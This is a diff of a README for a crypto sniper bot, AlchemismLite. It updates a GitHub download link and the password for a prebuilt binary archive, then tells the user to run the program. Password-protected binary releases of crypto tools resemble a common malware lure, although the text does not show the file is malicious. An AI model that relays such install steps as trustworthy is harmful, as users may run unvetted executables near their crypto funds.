@@ -105,8 +105,8 @@ To switch the blockchain the bot operates on, simply update the WSS_NODE endpoin
 
 Full installation guide here: [Alchemism Installation](https://alchemism.io/docs/getting-started/installation.html)
 
-1. [Download](https://github.com/AlchemismCrypto/crypto-sniper-bot/releases/download/Release/AlchemismLite-3.0.0.zip) latest release of AlchemismLite.
-2. Extract the binary files using password `release300`(actual password provided in the `PasswordInfo.txt` file).
+1. [Download](https://github.com/AlchemismCrypto/crypto-sniper-bot/releases/download/Release2/AlchemismLite-3.1.4.zip) latest release of AlchemismLite.
+2. Extract the binary files using password `release314`.
 3. Run the program and enter the AlchemismLite invitation code. For the public version, invitation codes are similar to licenses.
 4. After activation the program is ready for configuration.
 
